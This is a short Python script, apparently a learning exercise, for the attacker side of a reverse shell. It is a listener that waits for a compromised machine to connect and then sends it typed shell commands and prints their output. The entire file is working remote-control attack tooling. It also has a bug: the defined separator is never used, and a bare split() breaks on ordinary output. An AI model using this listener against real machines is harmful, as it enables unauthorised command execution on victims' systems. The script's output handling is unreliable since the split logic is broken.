# Writin' a shellbabbey - attacker side
import socket

server_host = "0.0.0.0"
server_port = 5003
buffer_size = 1024 * 128
#seperator string for multiple messages
seperator = "<sep>"
#create a socket object

s = socket.socket()

#bind the socket to all this host's IP addresses
s.bind((server_host, server_port))

#listen for incoming connections
s.listen(5)
print(f"Listening as {server_host}:{server_port} ...")
#accept incoming connection attempts:
client_socket, client_address = s.accept()
print("Connection received from:", client_address)

#receive the current working directory of the client attempting to connected
cwd = client_socket.recv(buffer_size).decode()
print("[+] Current working directory:", cwd)

#outgoing messages must be encoded into bytes before sending, and message must be sent using the client socket, not the server socket

while True:
    #get the command from prompt
    command = input(f"{cwd} > ")
    if not command.strip():
        #if an empty command
        continue
    #send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        #if the command is exit, just break
        break
    #retrieve command results
    output = client_socket.recv(buffer_size).decode()
    #split command output and current directory
    results, cwd = output.split()
    #print output
    print(results)


